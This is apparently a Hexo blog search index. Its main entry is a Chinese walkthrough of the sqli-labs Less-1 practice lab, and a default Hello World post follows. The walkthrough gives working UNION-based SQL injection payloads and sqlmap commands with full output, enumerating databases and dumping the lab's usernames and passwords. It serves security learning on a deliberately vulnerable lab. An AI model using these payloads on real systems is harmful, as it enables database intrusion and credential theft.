<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[sqli-labs_Less_1]]></title>
    <url>%2F2018%2F04%2F19%2Fsqli-labs-Less-1%2F</url>
    <content type="text"><![CDATA[sqli-labs练习SQL注入（mysql） 漏洞源代码下载：https://github.com/Audi-1/sqli-labs 手工注入(hackbar)Less-1 Get-Error-Single quotes-String从标题可以知是基于get请求方法的单引号字符报错 页面提示输入数字型参数 id /sqli-labs/Less-1/?id=1 返回正常页面 Welcome Dhakkan Your Login name:Dumb Your Password:Dumb 加一个单引号测试 sqli-labs/Less-1/?id=1&apos; 页面报错 Welcome Dhakkan You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 从外层依次去掉闭合的单引号可以看到只剩下 1’ ,可知为字符型注入（字符型和数字型的区别会在Less-2后区分），在这里使用 # 或– 注释掉多余的部分（当然，这里也可以使用其他方法闭合这个单引号），对#进行了url编码，构造好使其正常返回。 sqli-labs/Less-1/?id=1&apos; %23 返回正常 猜测字段数（order by ）使用联合查询 (union select)首先使用order by 进行字段数猜测 sqli-labs/Less-1/?id=1&apos; order by 10%23 返回错误 ：Unknown column ‘10’ in ‘order clause’ sqli-labs/Less-1/?id=1&apos; order by 5%23 返回正常 sqli-labs/Less-1/?id=1&apos; order by 6%23 返回错误可知字段数为 5 找到显示位sqli-labs/Less-1/?id=-1&apos; union select 1,2,3,4,5%23 这里注意把id的值设置为一个错误的，这里设置为了-1可知显示位在 2，3 Welcome Dhakkan Your Login name:2 Your Password:3 查看目标数据库基本信息sqli-labs/Less-1/?id=-1&apos; union select 1,version(),user(),4,5%23 返回如下 Welcome Dhakkan Your Login name:5.5.53 Your Password:root@localhost header 1 header 2 database() 返回当前数据库名 security user() 返回当前数据库连接使用的数据库 security version() 返回当前数据库的版本 5.5.53 system_user() 查询系统用户名 root@localhost session_user() 连接数据库的用户名 root@localhost current_user() 查询当前用户名 root@localhost @@version_compile_os 查询数据库操作系统 Win32 @@datadir 查询数据库路径 C:\phpStudy\MySQL\data\ @@basedir 查询MySQL路径 C:/phpStudy/MySQL/ 注：MySQL在5.xx版本以上有个information_schema数据库，该数据库记录了当前数据库的所有数据库、表、列、用户权限等信息，其中SCHEMATA 表存储MySQL所有数据库的基本信息，包括数据库名、编码类型路径等，show databases;结果取自此表；TABLE表存储MySQL中的表信息，show tables from schemaname;的结果取自此表；COLUMNS表：提供了表的列信息，show columns from schemaname.tablename;的结果取自此表 可得到该数据库基本信息 版本：5.5.53 用户：root@localhost 当前数据库名： security 获取数据库中的信息（database，table，column）获取数据库sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata %23 返回了数据库 information_schema,一般MySQL中不止一个数据库，可以在加个limit 1,1第一个1表示从那里开始，第二个1表示几个，可以通过不断更改第一个数来显示数据库 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, schema_name,4,5 from information_schema.schemata limit 2,1%23 当然更简单的方法是使用group_concat()一次性返回所有的 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(schema_name),4,5 from information_schema.schemata %23 返回：information_schema,challenges,mysql,performance_schema,security,testsecurity为需要查找的数据库 获取表sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=&apos;security&apos; %23 或者 sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(table_name),4,5 from information_schema.tables where table_schema=0x7365637572697479 %23 返回：emails,referers,uagents,users 注意：security是字符串要使用单引号包裹，或者将其转为十六进制，数值类型不需要单引号（有时可能会过滤掉单引号） 获取列sqli-labs/Less-1/?id=-1&apos; union all select 1,2, group_concat(column_name),4,5 from information_schema.columns where table_name=&apos;users&apos; %23 返回：id,username,password,first_name,last_name 获取数据到这里我们已经知道了数据库名security,表名users,列名id,username,password,first_name,last_name sqli-labs/Less-1/?id=-1&apos; union all select 1, group_concat(username),group_concat(password),4,5 from security.users %23 返回 Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4 Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4 工具注入(sqlmap)简单测试 (-u url)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --level 3 [*] starting at 15:33:02 [15:33:02] [INFO] resuming back-end DBMS &apos;mysql&apos; [15:33:02] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1&apos; AND 1906=1906-- PKiX Type: error-based Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR) Payload: id=1&apos; AND (SELECT 6992 FROM(SELECT COUNT(*),CONCAT(0x7162786271,(SELECT (ELT(6992=6992,1))),0x7162766a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- yOBo Type: AND/OR time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1&apos; AND SLEEP(5)-- PmIF Type: UNION query Title: Generic UNION query (NULL) - 5 columns Payload: id=-3918&apos; UNION ALL SELECT NULL,CONCAT(0x7162786271,0x58716e444643434d644b55716c6477776464456e4673725a4b65444771624356436a56647a76586b,0x7162766a71),NULL,NULL,NULL-- eMQX --- [15:33:03] [INFO] the back-end DBMS is MySQL web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 注：-v(–level) 3 同时显示注入的payload 列出数据库系统的数据库(–dbs)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dbs web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [14:51:37] [INFO] fetching database names [14:51:38] [INFO] the SQL query used returns 6 entries [14:51:39] [INFO] retrieved: information_schema [14:51:41] [INFO] retrieved: challenges [14:51:42] [INFO] retrieved: mysql [14:51:43] [INFO] retrieved: performance_schema [14:51:44] [INFO] retrieved: security [14:51:45] [INFO] retrieved: test available databases [6]: [*] challenges [*] information_schema [*] mysql [*] performance_schema [*] security [*] test 列出数据库表(–tables -D 数据库名，若无-D参数则显示数据库中所有表)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --tables -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:03:02] [INFO] fetching tables for database: &apos;security&apos; [15:03:03] [INFO] the SQL query used returns 4 entries [15:03:04] [INFO] retrieved: emails [15:03:05] [INFO] retrieved: referers [15:03:06] [INFO] retrieved: uagents [15:03:07] [INFO] retrieved: users Database: security [4 tables] +----------+ | emails | | referers | | uagents | | users | +----------+ 列出数据库中的列(–column -T 表名 -D 数据库名 若无-D参数则默认当前数据库)sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --column -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:08:34] [INFO] fetching columns for table &apos;users&apos; in database &apos;security&apos; [15:08:36] [INFO] the SQL query used returns 5 entries [15:08:37] [INFO] retrieved: &quot;id&quot;,&quot;int(3)&quot; [15:08:38] [INFO] retrieved: &quot;username&quot;,&quot;varchar(20)&quot; [15:08:39] [INFO] retrieved: &quot;password&quot;,&quot;varchar(20)&quot; [15:08:40] [INFO] retrieved: &quot;first_name&quot;,&quot;varchar(8)&quot; [15:08:41] [INFO] retrieved: &quot;last_name&quot;,&quot;varchar(8)&quot; Database: security Table: users [5 columns] +------------+-------------+ | Column | Type | +------------+-------------+ | first_name | varchar(8) | | id | int(3) | | last_name | varchar(8) | | password | varchar(20) | | username | varchar(20) | +------------+-------------+ 获取整某张表的信息(–dump -C column1，column2 -T tablename -D databasename )sqlmap -u &quot;http://xxx.xxx.xxx.xxx/sqli-labs/Less-1/?id=1&quot; --dump -C &apos;username&apos;,&apos;password&apos; -T &apos;users&apos; -D &apos;security&apos; web server operating system: Windows web application technology: PHP 5.4.45, Apache 2.4.23 back-end DBMS: MySQL &gt;= 5.0 [15:19:18] [INFO] fetching entries of column(s) &apos;password, username&apos; for table &apos;users&apos; in database &apos;security&apos; [15:19:18] [INFO] the SQL query used returns 13 entries [15:19:19] [INFO] retrieved: &quot;Dumb&quot;,&quot;Dumb&quot; [15:19:20] [INFO] retrieved: &quot;I-kill-you&quot;,&quot;Angelina&quot; [15:19:21] [INFO] retrieved: &quot;p@ssword&quot;,&quot;Dummy&quot; [15:19:22] [INFO] retrieved: &quot;crappy&quot;,&quot;secure&quot; [15:19:23] [INFO] retrieved: &quot;stupidity&quot;,&quot;stupid&quot; [15:19:24] [INFO] retrieved: &quot;genious&quot;,&quot;superman&quot; [15:19:25] [INFO] retrieved: &quot;mob!le&quot;,&quot;batman&quot; [15:19:26] [INFO] retrieved: &quot;admin&quot;,&quot;admin&quot; [15:19:27] [INFO] retrieved: &quot;admin1&quot;,&quot;admin1&quot; [15:19:29] [INFO] retrieved: &quot;admin2&quot;,&quot;admin2&quot; [15:19:30] [INFO] retrieved: &quot;admin3&quot;,&quot;admin3&quot; [15:19:31] [INFO] retrieved: &quot;dumbo&quot;,&quot;dhakkan&quot; [15:19:32] [INFO] retrieved: &quot;admin4&quot;,&quot;admin4&quot; [15:19:32] [INFO] analyzing table dump for possible password hashes Database: security Table: users [13 entries] +----------+------------+ | username | password | +----------+------------+ | Dumb | Dumb | | Angelina | I-kill-you | | Dummy | p@ssword | | secure | crappy | | stupid | stupidity | | superman | genious | | batman | mob!le | | admin | admin | | admin1 | admin1 | | admin2 | admin2 | | admin3 | admin3 | | dhakkan | dumbo | | admin4 | admin4 | +----------+------------+]]></content>
      <tags>
        <tag>sql注入</tag>
        <tag>sqli-labs</tag>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hello World]]></title>
    <url>%2F2018%2F04%2F10%2Fhello-world%2F</url>
    <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new "My New Post" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment]]></content>
      <categories>
        <category>Test</category>
      </categories>
      <tags>
        <tag>hello-world</tag>
        <tag>Test</tag>
      </tags>
  </entry>
</search>
